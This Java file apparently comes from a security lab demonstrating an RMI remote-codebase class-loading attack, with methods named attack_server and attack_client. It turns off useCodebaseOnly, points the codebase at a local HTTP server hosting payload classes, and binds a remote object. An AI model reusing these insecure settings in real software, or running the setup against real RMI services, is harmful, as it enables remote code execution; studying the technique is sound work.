import java.rmi.Naming;
import java.rmi.RMISecurityManager;
import java.rmi.registry.LocateRegistry;
import java.util.Objects;

public class RMIServer {

    public static void attack_server() throws Exception{
        System.setProperty("java.rmi.server.codebase", "http://127.0.0.1:8000/");
        System.setProperty("java.security.policy", Objects.requireNonNull(RMIServer.class.getClassLoader().getResource("java.policy")).getFile());
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
        RMISecurityManager rmiSecurityManager = new RMISecurityManager();
        System.setSecurityManager(rmiSecurityManager);

        RemoteObj remoteObj = new RemoteObj();
        LocateRegistry.createRegistry(1099);
        Naming.rebind("remoteObj", remoteObj);
    }

    public static void attack_client() throws Exception{

        RemoteObj remoteObj = new RemoteObj();
        LocateRegistry.createRegistry(1099);
        Naming.rebind("remoteObj", remoteObj);

    }
    public static void main(String[] args) throws Exception {

//        attack_server();//在payload.class文件处开启http服务
        attack_client();//在payload2.class文件处开启http服务

    }



}
